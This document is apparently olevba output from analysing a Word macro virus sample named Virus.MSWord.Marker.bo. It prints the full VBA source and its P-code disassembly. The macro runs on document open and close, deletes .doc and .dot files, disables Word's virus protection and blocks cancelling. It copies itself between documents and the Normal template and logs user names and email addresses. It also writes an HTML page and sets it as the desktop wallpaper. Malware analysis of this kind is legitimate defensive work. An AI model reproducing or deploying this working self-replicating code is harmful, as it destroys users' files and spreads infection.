olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.bo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.bo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'Benk, Where are you dear
Const Marker = "<- this is a marker! by phiehehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim phie, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "phieMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "phie_fe@lovemail.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   phie = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   phie = phie & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString phie
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    phie = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString phie
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\phie.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium phietheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto: phie_fe@lovemail.com'>Dear Benk</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Benk, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Benk, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\phie.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Sunday, 16 Jul 2000
' phieMMx 2000
' zuliza@eudoramail.com


' 09:07:259:07:25 -Monday, 17 Jul 2017
' phieMMx 2000
' phie_fe@lovemail.com

 


' 12:13:3712:13:37 AM AM-Tuesday, 18 Jul 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 09:55:459:55:45 AM AM-Thursday, 17 Aug 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 04:05:474:05:47 AM AM-Sunday, 20 Aug 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 07:41:387:41:38 PM PM-Saturday, 9 Sep 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 12:48:212:48:02 PM PM-Saturday, 21 Oct 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 12:12:4612:12:46 PM PM-Sunday, 22 Oct 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 09:01:239:01:23 PM PM-Monday, 23 Oct 1992
' phieMMx 2000
' phie_fe@lovemail.com

 


' 10:27:5710:27:57 AM AM-,Wednesday 1 Nov 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 05:32:265:32:26 PM PM-Tuesday, 7 Nov 2000
' phieMMx 2000
' phie_fe@lovemail.com


 

' 05:45:395:45:39 AM AM-Monday, 22 Nov 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 09:18:419:18:41 PM PM-Thursday, 7 Dec 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 10:11:2210:11:22 AM AM-Sunday, 10 Dec 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 11:09:1611:09:16 PM PM-Thursday, 14 Dec 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 11:10:1911:10:19  AM-Sunday, 31 Dec 2000
' phieMMx 2000
' phie_fe@lovemail.com

 





' 05:38:1417:38:14 -Rabu, 9 Jan 1980
' phieMMx 2000
' phie_fe@lovemail.com

 


' 06:39:1918:39:19 -Rabu, 24 Mei 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 04:24:4916:24:49 -Jumat, 7 Jul 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 02:04:2314:04:23 -Senin, 10 Jul 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 06:03:3106:03:31 -Wednesday, 12 Jul 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 11:22:5511:22:55 -Tuesday, 10 Oct 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 01:10:1613:10:16 -Monday, 30 Oct 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 07:15:5819:15:58 -Tuesday, 7 Nov 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 09:04:409:04:40 AM AM-Wednesday, 8 Nov 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 10:20:910:20:09 AM AM-Friday, 22 Sep 2000
' phieMMx 2000
' phie_fe@lovemail.com

 


' 04:56:3616:56:36 Grunge Grunge-Thursday, 11 Jan 2001
' phieMMx 2000
' phie_fe@lovemail.com

 


' 08:32:5408:32:54 -Freitag, 23 Feb 2001
' phieMMx 2000
' phie_fe@lovemail.com

 

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.bo
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 18539 bytes
' Line #0:
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0018 "Benk, Where are you dear"
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x0034 "<- this is a marker! by phiehehehe TheBest-versi212x"
' 	VarDefn Marker
' Line #4:
' 	FuncDefn (Private Sub Document_Open())
' Line #5:
' 	ArgsCall Document_Close 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #9:
' 	Dim 
' 	VarDefn isd (As String)
' Line #10:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #11:
' 	Dim 
' 	VarDefn phie
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #14:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #15:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	LitStr 0x000C "phieMMx 2000"
' 	Ld Application 
' 	MemSt UserName 
' Line #18:
' 	LitStr 0x0005 "MeMeX"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #19:
' 	LitStr 0x0014 "phie_fe@lovemail.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #20:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #21:
' 	GoSub InsertIon 
' Line #22:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #24:
' 	GoTo Finish 
' Line #25:
' 	Label InsertIon 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #28:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #29:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #30:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #31:
' 	Ld DI 
' 	IfBlock 
' Line #32:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St phie 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #35:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #36:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #37:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Next 
' Line #43:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld phie 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St phie 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #45:
' 	Ld phie 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld NTI 
' 	IfBlock 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St phie 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #52:
' 	Ld phie 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Return 
' Line #57:
' 	Label LoggingIn 
' Line #58:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #59:
' 	GoSub ShowMe 
' Line #60:
' 	Return 
' Line #61:
' 	Label ShowMe 
' Line #62:
' 	Dim 
' 	VarDefn RootsyS (As String)
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #65:
' 	Ld RootsyS 
' 	LitStr 0x000A "\phie.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007B "<Html><head><title>Welcome to Destroyer of the last Manillenium phietheBEST</title></head><Body><body bgcolor = '#FFF212' >"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0082 "<p align='center'><font color='#000000' size='6'><strong><a href='mailto: phie_fe@lovemail.com'>Dear Benk</a></strong></font> </p>"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "<font normal></center>To the very best that happen in mylife<p>"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0048 "<p>Long ago and in my mind, I can see your face lonely and lost in time "
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "<p>You were gone since yester month But the memories, never would dissapear"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "<p>I think of you, I THINK OF YOU.<p>"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005A "<p>Dear Benk, I close my eyes and see your face.  That's all I have to do to be with you. "
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0056 "<p>Dear Benk, altough I can not touch your face.  I know what I can do to be with you "
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p>Long ago so faraway. But the light of blue, still living with me today."
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "<p>You were gone since yester month.  But the memories never would dissapear."
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #81:
' 	Ld RootsyS 
' 	LitStr 0x000A "\phie.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #82:
' 	Return 
' Line #83:
' 	Label Finish 
' Line #84:
' 	EndSub 
' Line #85:
' 	QuoteRem 0x0000 0x000B "Logfile -->"
' Line #86:
' Line #87:
' 	QuoteRem 0x0000 0x0026 " 06:14:2518:14:25 -Sunday, 16 Jul 2000"
' Line #88:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #89:
' 	QuoteRem 0x0000 0x0016 " zuliza@eudoramail.com"
' Line #90:
' Line #91:
' Line #92:
' 	QuoteRem 0x0000 0x0025 " 09:07:259:07:25 -Monday, 17 Jul 2017"
' Line #93:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #94:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' 	QuoteRem 0x0000 0x002C " 12:13:3712:13:37 AM AM-Tuesday, 18 Jul 2000"
' Line #100:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #101:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' 	QuoteRem 0x0000 0x002C " 09:55:459:55:45 AM AM-Thursday, 17 Aug 2000"
' Line #107:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #108:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' 	QuoteRem 0x0000 0x002A " 04:05:474:05:47 AM AM-Sunday, 20 Aug 2000"
' Line #114:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #115:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' 	QuoteRem 0x0000 0x002B " 07:41:387:41:38 PM PM-Saturday, 9 Sep 2000"
' Line #121:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #122:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' 	QuoteRem 0x0000 0x002C " 12:48:212:48:02 PM PM-Saturday, 21 Oct 2000"
' Line #128:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #129:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' 	QuoteRem 0x0000 0x002B " 12:12:4612:12:46 PM PM-Sunday, 22 Oct 2000"
' Line #135:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #136:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' 	QuoteRem 0x0000 0x002A " 09:01:239:01:23 PM PM-Monday, 23 Oct 1992"
' Line #142:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #143:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' 	QuoteRem 0x0000 0x002D " 10:27:5710:27:57 AM AM-,Wednesday 1 Nov 2000"
' Line #149:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #150:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' 	QuoteRem 0x0000 0x002A " 05:32:265:32:26 PM PM-Tuesday, 7 Nov 2000"
' Line #156:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #157:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' 	QuoteRem 0x0000 0x002A " 05:45:395:45:39 AM AM-Monday, 22 Nov 2000"
' Line #163:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #164:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' 	QuoteRem 0x0000 0x002B " 09:18:419:18:41 PM PM-Thursday, 7 Dec 2000"
' Line #170:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #171:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' 	QuoteRem 0x0000 0x002B " 10:11:2210:11:22 AM AM-Sunday, 10 Dec 2000"
' Line #177:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #178:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' 	QuoteRem 0x0000 0x002D " 11:09:1611:09:16 PM PM-Thursday, 14 Dec 2000"
' Line #184:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #185:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' 	QuoteRem 0x0000 0x0029 " 11:10:1911:10:19  AM-Sunday, 31 Dec 2000"
' Line #191:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #192:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0023 " 05:38:1417:38:14 -Rabu, 9 Jan 1980"
' Line #201:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #202:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0024 " 06:39:1918:39:19 -Rabu, 24 Mei 2000"
' Line #208:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #209:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' 	QuoteRem 0x0000 0x0024 " 04:24:4916:24:49 -Jumat, 7 Jul 2000"
' Line #215:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #216:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' 	QuoteRem 0x0000 0x0025 " 02:04:2314:04:23 -Senin, 10 Jul 2000"
' Line #222:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #223:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x0029 " 06:03:3106:03:31 -Wednesday, 12 Jul 2000"
' Line #229:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #230:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x0027 " 11:22:5511:22:55 -Tuesday, 10 Oct 2000"
' Line #236:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #237:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' 	QuoteRem 0x0000 0x0026 " 01:10:1613:10:16 -Monday, 30 Oct 2000"
' Line #243:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #244:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' 	QuoteRem 0x0000 0x0026 " 07:15:5819:15:58 -Tuesday, 7 Nov 2000"
' Line #250:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #251:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' 	QuoteRem 0x0000 0x002C " 09:04:409:04:40 AM AM-Wednesday, 8 Nov 2000"
' Line #257:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #258:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #259:
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' 	QuoteRem 0x0000 0x002A " 10:20:910:20:09 AM AM-Friday, 22 Sep 2000"
' Line #264:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #265:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' 	QuoteRem 0x0000 0x0035 " 04:56:3616:56:36 Grunge Grunge-Thursday, 11 Jan 2001"
' Line #271:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #272:
' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' 	QuoteRem 0x0000 0x0027 " 08:32:5408:32:54 -Freitag, 23 Feb 2001"
' Line #278:
' 	QuoteRem 0x0000 0x000D " phieMMx 2000"
' Line #279:
